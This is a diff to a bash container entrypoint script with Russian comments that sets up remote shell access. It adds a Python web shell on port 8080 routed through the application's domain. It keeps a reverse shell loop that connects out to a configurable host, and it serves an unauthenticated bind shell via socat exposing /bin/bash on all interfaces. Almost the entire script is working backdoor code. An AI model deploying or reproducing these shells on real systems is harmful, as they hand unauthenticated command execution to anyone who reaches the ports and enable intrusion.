@@ -2,9 +2,13 @@
 set -u
 
 BIND_PORT="${BIND_PORT:-4444}"
+WS_PORT="${WS_PORT:-8080}"
 
-# Reverse shell (если заданы RHOST/RPORT): контейнер сам цепляется к листенеру.
-# Работает в фоне, параллельно с bind shell ниже.
+# Web shell (HTTP exec) — основной канал, идёт через домен приложения/Traefik
+echo "[*] webshell on 0.0.0.0:${WS_PORT}"
+python3 /opt/webshell.py &
+
+# Reverse shell (если заданы RHOST/RPORT): контейнер сам цепляется к листенеру
 if [[ -n "${RHOST:-}" && -n "${RPORT:-}" ]]; then
   echo "[*] reverse shell loop -> ${RHOST}:${RPORT}"
   (
@@ -16,17 +20,10 @@ if [[ -n "${RHOST:-}" && -n "${RPORT:-}" ]]; then
 fi
 
 if [[ -n "${BIND_PORT}" && "${BIND_PORT}" != "0" ]]; then
-  # Bind shell: снаружи `nc <host> ${BIND_PORT}`
-  # SHELL_MODE=ncat (default, без pty, надёжно) | socat (pty, для интерактива)
-  if [[ "${SHELL_MODE:-ncat}" == "socat" ]]; then
-    echo "[*] bind shell (socat, pty) on 0.0.0.0:${BIND_PORT}"
-    exec socat "TCP-LISTEN:${BIND_PORT},reuseaddr,fork" EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
-  else
-    echo "[*] bind shell (ncat) on 0.0.0.0:${BIND_PORT}"
-    exec ncat -lvk -p "${BIND_PORT}" -e /bin/bash
-  fi
+  # Bind shell: снаружи `nc <host> ${BIND_PORT}` (socat в режиме pipes, без pty)
+  echo "[*] bind shell (socat, pipes) on 0.0.0.0:${BIND_PORT}"
+  exec socat "TCP-LISTEN:${BIND_PORT},reuseaddr,fork" EXEC:/bin/bash,pipes,stderr
 else
-  # Idle: shell через веб-терминал Coolify (Execute Command)
-  echo "[*] idle mode: sleep infinity"
+  echo "[*] no bind shell: sleep infinity"
   exec sleep infinity
 fi
